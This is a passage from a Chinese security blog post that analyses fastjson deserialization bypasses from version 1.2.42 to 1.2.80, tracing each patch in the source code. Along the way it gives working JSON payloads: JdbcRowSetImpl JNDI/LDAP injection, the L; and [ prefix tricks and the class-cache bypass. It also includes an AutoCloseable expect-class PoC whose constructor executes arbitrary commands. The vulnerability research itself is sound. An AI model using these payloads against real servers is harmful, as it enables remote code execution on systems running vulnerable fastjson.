<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;[com.sun.rowset.JdbcRowSetImpl&quot;</span><span class="punctuation">[</span><span class="punctuation">&#123;</span><span class="punctuation">,</span> <span class="attr">&quot;dataSourceName&quot;</span><span class="punctuation">:</span><span class="string">&quot;ldap://127.0.0.1:1389/knwwcb&quot;</span><span class="punctuation">,</span> <span class="attr">&quot;autoCommit&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">true</span></span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<p>1.2.25 &lt;&#x3D; fastjson &lt; 1.2.48</p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;a&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;java.lang.Class&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;val&quot;</span><span class="punctuation">:</span><span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;b&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;dataSourceName&quot;</span><span class="punctuation">:</span><span class="string">&quot;ldap://127.0.0.1:1389/ubjazx&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;autoCommit&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">true</span></span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>


<p>我们来看一下这三个版本是怎么修复的</p>
<h3 id="fastjson-1-2-42的修复"><a href="#fastjson-1-2-42的修复" class="headerlink" title="fastjson 1.2.42的修复"></a>fastjson 1.2.42的修复</h3><p>其实在1.2.42版本中对于<code>L ;</code>绕过已经修复过一次了<br>版本改到1.2.42, 使用<code>Lcom.sun.rowset.JdbcRowSetImpl;</code>这个类名去打<br>直接去看TypeUtils.loadClass<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250601000340.png" alt="image.png"><br>可以看见先对className的第一个字母和最后一个字母做了一次哈希, 如果值为<code>0x9198507b5af98f0L</code>则切割掉这两个字符, 很明显就是不允许类名前面为<code>L</code>后面为<code>;</code><br>这个版本切割得到的类名也不再是在明文的黑名单中去比较, 而是改成了哈希值列表<code>denyHashCodes</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">0 = -8720046426850100497</span><br><span class="line">1 = -8109300701639721088</span><br><span class="line">2 = -7966123100503199569</span><br><span class="line">3 = -7766605818834748097</span><br><span class="line">4 = -6835437086156813536</span><br><span class="line">5 = -4837536971810737970</span><br><span class="line">6 = -4082057040235125754</span><br><span class="line">7 = -2364987994247679115</span><br><span class="line">8 = -1872417015366588117</span><br><span class="line">10 = -190281065685395680</span><br><span class="line">9 = -254670111376247151</span><br><span class="line">11 = 33238344207745342</span><br><span class="line">12 = 313864100207897507</span><br><span class="line">13 = 1203232727967308606</span><br><span class="line">14 = 1502845958873959152</span><br><span class="line">15 = 3547627781654598988</span><br><span class="line">16 = 3730752432285826863</span><br><span class="line">17 = 3794316665763266033</span><br><span class="line">18 = 4147696707147271408</span><br><span class="line">19 = 5347909877633654828</span><br><span class="line">20 = 5450448828334921485</span><br><span class="line">21 = 5751393439502795295</span><br><span class="line">22 = 5944107969236155580</span><br><span class="line">23 = 6742705432718011780</span><br><span class="line">24 = 7179336928365889465</span><br><span class="line">25 = 7442624256860549330</span><br><span class="line">26 = 8838294710098435315</span><br></pre></td></tr></table></figure>
<p>把我们的<code>Lcom.sun.rowset.JdbcRowSetImpl;</code>净化为<code>com.sun.rowset.JdbcRowSetImpl</code>再hash后去在中查找, 很明显denyHashCodes中是有这个类对应的hash值的, 但是这样的过滤无济于事, 前面说过, loadClass在处理<code>L ;</code>时是递归的, 这里双写或者多加几层就绕过去了</p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;LLLLcom.sun.rowset.JdbcRowSetImpl;;;;&quot;</span><span class="punctuation">,</span> <span class="attr">&quot;dataSourceName&quot;</span><span class="punctuation">:</span><span class="string">&quot;ldap://127.0.0.1:1389/knwwcb&quot;</span><span class="punctuation">,</span> <span class="attr">&quot;autoCommit&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">true</span></span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<p>还有这个denyHashCodes列表, 在网上也有大牛进行了爆破, 参考</p>
<p><strong><a target="_blank" rel="noopener" href="https://github.com/LeadroyaL/fastjson-blacklist">fastjson-blacklist</a></strong></p>
<h3 id="fastjson-1-2-43的修复"><a href="#fastjson-1-2-43的修复" class="headerlink" title="fastjson 1.2.43的修复"></a>fastjson 1.2.43的修复</h3><p>这个版本对前面的双写又进行了修复<br>版本改到1.2.43, 直接去看TypeUtils.loadClass<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250531234452.png" alt="image.png"></p>
<p>在checkAutoType又中添加了一层判断, 在出现<code>L</code>开头, <code>;</code>结尾的情况下, 出现<code>LL</code>开头就抛出错误, 这样就不能多层<code>L ;</code>绕过了. 但是别忘了, 我们还可以嵌套一层<code>[</code>来绕过</p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;[com.sun.rowset.JdbcRowSetImpl&quot;</span><span class="punctuation">[</span><span class="punctuation">&#123;</span><span class="punctuation">,</span> <span class="attr">&quot;dataSourceName&quot;</span><span class="punctuation">:</span><span class="string">&quot;ldap://127.0.0.1:1389/knwwcb&quot;</span><span class="punctuation">,</span> <span class="attr">&quot;autoCommit&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">true</span></span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
<p>或者</p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;[Lcom.sun.rowset.JdbcRowSetImpl;&quot;</span><span class="punctuation">[</span><span class="punctuation">&#123;</span><span class="punctuation">,</span> <span class="attr">&quot;dataSourceName&quot;</span><span class="punctuation">:</span><span class="string">&quot;ldap://127.0.0.1:1389/knwwcb&quot;</span><span class="punctuation">,</span> <span class="attr">&quot;autoCommit&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">true</span></span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
<h3 id="fastjson-1-2-44的修复"><a href="#fastjson-1-2-44的修复" class="headerlink" title="fastjson 1.2.44的修复"></a>fastjson 1.2.44的修复</h3><p>同样地, 拿上个版本的payload去打, 看看怎么回事<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250601003546.png" alt="image.png"><br>很明显这里不让<code>[</code>开头了, 第907行也不让<code>;</code>结尾了, 这条路算是堵死了, 当然了, 这个版本我们依然可以使用上面的缓存机制绕过</p>
<h3 id="fastjson-1-2-48的修复"><a href="#fastjson-1-2-48的修复" class="headerlink" title="fastjson 1.2.48的修复"></a>fastjson 1.2.48的修复</h3><p>在这个版本我们依旧尝试之前的缓存绕过来打, 看看报什么错, 由于可控的<code>mappings.put</code>是在TypeUtils.loadClass中的, 我们把断点打在loadClass中,<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250601135215.png" alt="image.png"><br>如上图. 可以看见这里加了一个参数<code>cache</code>默认为<code>false</code>, 不进行缓存, 往回调看前一个调用栈<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250601135346.png" alt="image.png"><br>cache的值是写死在MiscCodec类中的, 导致不缓存加载过的危险类</p>
<h2 id="fastjson-1-2-68-期望类利用-AutoCloseable"><a href="#fastjson-1-2-68-期望类利用-AutoCloseable" class="headerlink" title="fastjson 1.2.68 期望类利用(AutoCloseable)"></a>fastjson 1.2.68 期望类利用(AutoCloseable)</h2><p>在1.2.48中已经修复了缓存机制的绕过, 而在1.2.68中又爆出了新的利用方式, 利用expectClass<br>实现了<code>java.lang.AutoCloseable</code>接口的类可以被反序列化</p>
<p>&#x3D;&#x3D;为什么<code>java.lang.AutoCloseable</code>的实现类会被利用?&#x3D;&#x3D;<br>一些文件操作的类是实现了<code>java.lang.AutoCloseable</code>接口的, 在浅蓝师傅的文章中提到可以去挖掘文件操作的类作为新的gadget:</p>
<p><a target="_blank" rel="noopener" href="https://b1ue.cn/archives/382.html">fastjson 1.2.68 autotype bypass 反序列化漏洞 gadget 的一种挖掘思路</a></p>
<p>本篇只讨论fastjosn本身的绕过, 不研究gadget(懒..</p>
<p>这里用下面的demo来测试</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">AttackVersion_1_2_68</span><span class="params">(String cmd)</span> &#123;  </span><br><span class="line">    <span class="type">String</span> <span class="variable">poc</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;java.lang.AutoCloseable\&quot;,\&quot;@type\&quot;:\&quot;EvilClass.VulAutoCloseable\&quot;,\&quot;cmd\&quot;:\&quot;&quot;</span> + cmd + <span class="string">&quot;\&quot;&#125;&quot;</span>;  </span><br><span class="line">    System.out.println(poc);  </span><br><span class="line">    <span class="keyword">return</span> poc;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> EvilClass;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">VulAutoCloseable</span> <span class="keyword">implements</span> <span class="title class_">AutoCloseable</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">VulAutoCloseable</span><span class="params">(String cmd)</span> &#123;  </span><br><span class="line">        <span class="keyword">try</span> &#123;  </span><br><span class="line">            Runtime.getRuntime().exec(cmd);  </span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;  </span><br><span class="line">            e.printStackTrace();  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="meta">@Override</span>  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">close</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;  </span><br><span class="line">  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>&#x3D;&#x3D;<code>java.lang.AutoCloseable</code>存在于默认的mapings中&#x3D;&#x3D;, 所以能够通过checkAutoType的检查,<br>json解析器通过<code>java.lang.AutoCloseable</code>获取对应的反序列化器为一个<code>JavaBeanDeserializer</code>(<code>config.getDeserializer</code>的逻辑是经过一系列判断后还未找到与其对应的反序列化器时, 就构造一个JavaBeanDeserializer, 即使这个类并不是一个JavaBean), <code>JavaBeanDeserializer</code>解析到后面的<code>@type</code>, 拿到对应的类名<code>EvilClass.VulAutoCloseable</code> , 又会尝试去获取<code>EvilClass.VulAutoCloseable</code>的反序列化器, 在此之前会对此类名进行<code>checkAutoType</code>检查, 此时会将<code>java.lang.AutoCloseable</code>作为期望类传入, 但这个版本AutoType会校验<code>EvilClass.VulAutoCloseable</code>和期望类, 具体如下:</p>
<p>期望类不能是下面几种:<br>(可以看见这里是没有禁用<code>java.lang.AutoCloseable</code>)</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Object.<span class="keyword">class</span>  </span><br><span class="line"><span class="title class_">Serializable</span>.<span class="keyword">class</span>  </span><br><span class="line"><span class="title class_">Cloneable</span>.<span class="keyword">class</span>  </span><br><span class="line"><span class="title class_">Closeable</span>.<span class="keyword">class</span>  </span><br><span class="line"><span class="title class_">EventListener</span>.<span class="keyword">class</span>  </span><br><span class="line"><span class="title class_">Iterable</span>.<span class="keyword">class</span>  </span><br><span class="line"><span class="title class_">Collection</span>.class </span><br></pre></td></tr></table></figure>

<p><code>EvilClass.VulAutoCloseable</code>不能实现以下接口(或类继承)</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">java.lang.ClassLoader.class <span class="comment">// classloader is danger  </span></span><br><span class="line">javax.sql.DataSource.class <span class="comment">// dataSource can load jdbc driver  </span></span><br><span class="line">javax.sql.RowSet.class</span><br></pre></td></tr></table></figure>
<p>由于很多jndi的利用类都是实现了<code>javax.sql.DataSource.class</code>和<code>javax.sql.RowSet.class</code>, 这里的限制就导致了很难再进行jndi注入了</p>
<p>我们还是跟踪代码过一遍调试<br>前面的不必多说, 从<code>DefaultJSONParser</code>解析出<code>java.lang.AutoCloseable</code>开始<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250603100421.png" alt="image.png"><br>对<code>java.lang.AutoCloseable</code>进行checkAutoType检查, 跟进<br>&#x3D;&#x3D;<code>java.lang.AutoCloseable</code>是存在于默认的mappings中的&#x3D;&#x3D;(也就是我们再之前利用缓存绕过的那个mappings)</p>
<p><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250603101026.png" alt="image.png"></p>
<p>从mappings中拿到class, 在1374行返回<br>回到<code>DefaultJSONParser</code>, 往下走, 拿到其反序列化器, 是一个<code>JavaBeanDeserializer</code>, 跟进反序列化<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250603101420.png" alt="image.png"></p>
<p>再跟进, 后面json字符串扫描过程和之前一样的, 依旧是扫描到<code>@type</code>的值后再checkAutoType, 再尝试获取反序列化器<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250603102044.png" alt="image.png"><br>注意此时对<code>EvilClass.VulAutoCloseable</code>进行checkAutoType时传入了期望类<code>AutoCloseable</code> 跟进<br>这里有期望类的黑名单<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250603102437.png" alt="image.png"></p>
<p>在这里, 我们的自定义的类被加载<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250603102755.png" alt="image.png"></p>
<p>再往下, 对被check的类做了一些检查, 不能继承黑名单中的接口或类, 且需要继承期望类<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250603102604.png" alt="image.png"><br>通过检查后, 返回到json解析器, 之后就是拿到反序列化器进行反序列化的过程了, 最终就是和之前一样, 调用构造器实例化这个类, 然后调用它的getter和setter为其添加属性</p>
<p>此利用方式在1.2.69被修复, 修复方式就是黑名单, 并且这次对期望类的黑名单也改为了哈希<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250603140542.png" alt="image.png"></p>
<h2 id="fastjson-1-2-80-期望类利用-异常类Throwable"><a href="#fastjson-1-2-80-期望类利用-异常类Throwable" class="headerlink" title="fastjson 1.2.80 期望类利用(异常类Throwable)"></a>fastjson 1.2.80 期望类利用(异常类Throwable)</h2><p>1.2.68的修复方式简单粗暴，将<code>java.lang.Runnable</code>、<code>java.lang.Readable</code>和<code>java.lang.AutoCloseable</code>加入了黑名单，那么1.2.80用的就是另一个期望类：异常类Throwable。</p>
<p>触发过程和之前的一样AutoCloseable一样, 困难点就是在于寻找对应的gadget了</p>
<h2 id="fastjson-1-2-80-期望类利用-Exception"><a href="#fastjson-1-2-80-期望类利用-Exception" class="headerlink" title="fastjson 1.2.80 期望类利用(Exception)"></a>fastjson 1.2.80 期望类利用(Exception)</h2><p>依旧困难点是在于寻找对应的gadget了, 最近的京麒2025在最新版本1.2.83也是利用的这个期望类</p>
<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a target="_blank" rel="noopener" href="https://y4er.com/posts/fastjson-1.2.80/">y4er.com# fastjson 1.2.80 漏洞分析</a><br><a target="_blank" rel="noopener" href="https://b1ue.cn/archives/382.html">b1ue.cn# fastjson 1.2.68 autotype bypass 反序列化漏洞 gadget 的一种挖掘思路</a><br><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/l1J4cGfqI_SssGKML7-z3w">https://mp.weixin.qq.com/s/l1J4cGfqI_SssGKML7-z3w</a></p>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="http://example.com">n4c1</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="http://example.com/2025/09/10/Fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">http://example.com/2025/09/10/Fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://example.com" target="_blank">n4c1's Blog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"></div><div class="post_share"><div class="social-share" data-image="/img/head.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2025/09/10/c3p0%E5%88%A9%E7%94%A8/" title="c3p0利用"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">c3p0利用</div></div></a></div><div class="next-post pull-right"><a href="/2025/09/10/Spring%E6%9E%B6%E6%9E%84%E5%8E%9F%E7%90%86-Spring%E5%86%85%E5%AD%98%E9%A9%AC/" title="Spring架构原理 &amp; Spring内存马"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">Spring架构原理 &amp; Spring内存马</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/head.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">n4c1</div><div class="author-info__description">hello,world</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">63</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">51</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">7</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xxxxxx"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#fastjson"><span class="toc-number">1.</span> <span class="toc-text">fastjson&lt;&#x3D;1.2.24 反序列化漏洞（CVE-2017-18349)</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#TemplatesImpl"><span class="toc-number">1.1.</span> <span class="toc-text">TemplatesImpl</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%B0%83%E8%AF%95%E5%88%86%E6%9E%90"><span class="toc-number">1.1.1.</span> <span class="toc-text">调试分析</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#JdbcRowSetImpl"><span class="toc-number">1.2.</span> <span class="toc-text">JdbcRowSetImpl</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%95%E8%BF%87waf"><span class="toc-number">1.3.</span> <span class="toc-text">绕过waf</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#fastjson-1-2-25-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-%E5%AF%B9%E6%8A%97checkAutoType%E7%9A%84%E5%BC%80%E5%A7%8B"><span class="toc-number">2.</span> <span class="toc-text">fastjson 1.2.25 反序列化漏洞 对抗checkAutoType的开始</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E7%BC%93%E5%AD%98%E7%BB%95%E8%BF%87%E9%BB%91%E5%90%8D%E5%8D%95"><span class="toc-number">2.1.</span> <span class="toc-text">利用缓存绕过黑名单</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#AutoType%E5%BC%80%E5%90%AF%E6%97%B6%E7%9A%84%E7%BB%95%E8%BF%87-%E5%88%A9%E7%94%A8%E5%AD%97%E7%AC%A6%E5%89%8D%E7%BC%80"><span class="toc-number">2.2.</span> <span class="toc-text">AutoType开启时的绕过 利用字符前缀</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#fastjson-1-2-42%E7%9A%84%E4%BF%AE%E5%A4%8D"><span class="toc-number">2.3.</span> <span class="toc-text">fastjson 1.2.42的修复</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#fastjson-1-2-43%E7%9A%84%E4%BF%AE%E5%A4%8D"><span class="toc-number">2.4.</span> <span class="toc-text">fastjson 1.2.43的修复</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#fastjson-1-2-44%E7%9A%84%E4%BF%AE%E5%A4%8D"><span class="toc-number">2.5.</span> <span class="toc-text">fastjson 1.2.44的修复</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#fastjson-1-2-48%E7%9A%84%E4%BF%AE%E5%A4%8D"><span class="toc-number">2.6.</span> <span class="toc-text">fastjson 1.2.48的修复</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#fastjson-1-2-68-%E6%9C%9F%E6%9C%9B%E7%B1%BB%E5%88%A9%E7%94%A8-AutoCloseable"><span class="toc-number">3.</span> <span class="toc-text">fastjson 1.2.68 期望类利用(AutoCloseable)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#fastjson-1-2-80-%E6%9C%9F%E6%9C%9B%E7%B1%BB%E5%88%A9%E7%94%A8-%E5%BC%82%E5%B8%B8%E7%B1%BBThrowable"><span class="toc-number">4.</span> <span class="toc-text">fastjson 1.2.80 期望类利用(异常类Throwable)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#fastjson-1-2-80-%E6%9C%9F%E6%9C%9B%E7%B1%BB%E5%88%A9%E7%94%A8-Exception"><span class="toc-number">5.</span> <span class="toc-text">fastjson 1.2.80 期望类利用(Exception)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5"><span class="toc-number">6.</span> <span class="toc-text">参考链接</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/09/22/WMCTF-2025-CTF-WEB-WP/" title="WMCTF 2025 CTF WEB WP">WMCTF 2025 CTF WEB WP</a><time datetime="2025-09-22T06:39:47.000Z" title="发表于 2025-09-22 14:39:47">2025-09-22</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/09/15/%E9%95%BF%E5%9F%8E%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B%E6%9A%A8%E4%BA%AC%E6%B4%A5%E5%86%80%E8%92%99%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E7%AB%9E%E8%B5%9B%EF%BC%88%E5%88%9D%E8%B5%9B%EF%BC%89-WEB-WP/" title="长城杯网络安全大赛暨京津冀蒙网络安全技能竞赛（初赛） WEB WP">长城杯网络安全大赛暨京津冀蒙网络安全技能竞赛（初赛） WEB WP</a><time datetime="2025-09-15T09:07:40.000Z" title="发表于 2025-09-15 17:07:40">2025-09-15</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/09/15/sekaictf-2025-hqli-me/" title="sekaictf 2025 hqli-me">sekaictf 2025 hqli-me</a><time datetime="2025-09-15T09:00:10.000Z" title="发表于 2025-09-15 17:00:10">2025-09-15</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/09/10/SnakeYaml%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" title="SnakeYaml反序列化">SnakeYaml反序列化</a><time datetime="2025-09-10T07:37:58.000Z" title="发表于 2025-09-10 15:37:58">2025-09-10</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/09/10/c3p0%E5%88%A9%E7%94%A8/" title="c3p0利用">c3p0利用</a><time datetime="2025-09-10T06:55:56.000Z" title="发表于 2025-09-10 14:55:56">2025-09-10</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2025 By n4c1</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=4.12.0"></script><script src="/js/main.js?v=4.12.0"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.32/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"></div><script id="canvas_nest" defer="defer" color="0,0,255" opacity="0.7" zIndex="-1" count="99" mobile="false" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/dist/canvas-nest.min.js"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/dist/activate-power-mode.min.js"></script><script>POWERMODE.colorful = true;
POWERMODE.shake = true;
POWERMODE.mobile = true;
document.body.addEventListener('input', POWERMODE);
